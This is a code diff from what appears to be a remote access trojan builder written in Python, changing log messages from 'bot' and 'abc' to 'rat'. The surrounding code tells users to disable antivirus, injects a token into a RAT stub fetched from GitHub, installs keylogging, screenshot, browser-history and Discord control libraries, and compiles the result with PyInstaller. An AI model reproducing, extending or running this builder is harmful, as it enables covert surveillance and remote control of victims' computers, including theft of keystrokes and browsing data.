@@ -14,7 +14,7 @@ def rat_builder_init():
 
     stub_template = "modules/stub/rat_stub.txt"
     if not os.path.exists(stub_template):
-        print(Colorate.Horizontal(_cl["num"], f"  [!] bot template not found: {stub_template}"))
+        print(Colorate.Horizontal(_cl["num"], f"  [!] Rat template not found: {stub_template}"))
         print(Colorate.Horizontal(_cl["txt"], f"  [!] Warning: The file will be downloaded from GitHub. Turn off ur antivirus! Otherwise the stub will be deleted."))
         input(Colorate.Horizontal(_cl["head"], "  Press Enter to start the download..."))
         try:
@@ -49,12 +49,12 @@ def rat_builder_init():
         with open(temp_stub, "w", encoding="utf-8") as f:
             f.write(content)
 
-        print(Colorate.Horizontal(_cl["head"], "  [+] Token injected into abc."))
+        print(Colorate.Horizontal(_cl["head"], "  [+] Token injected into rat."))
 
         print(Colorate.Horizontal(_cl["txt"], "  [*] Preparing dependencies..."))
         subprocess.check_call([sys.executable, "-m", "pip", "install", "pyinstaller", "comtypes", "pycaw", "pyautogui", "browserhistory", "mss", "pynput", "discord.py", "requests", "pywin32", "-q"])
 
-        print(Colorate.Horizontal(_cl["txt"], "  [*] Compiling abc (Bundling all modules)..."))
+        print(Colorate.Horizontal(_cl["txt"], "  [*] Compiling rat (Bundling all modules)..."))
         
         output_dir = os.path.join(os.getcwd(), "output")
         if not os.path.exists(output_dir): 
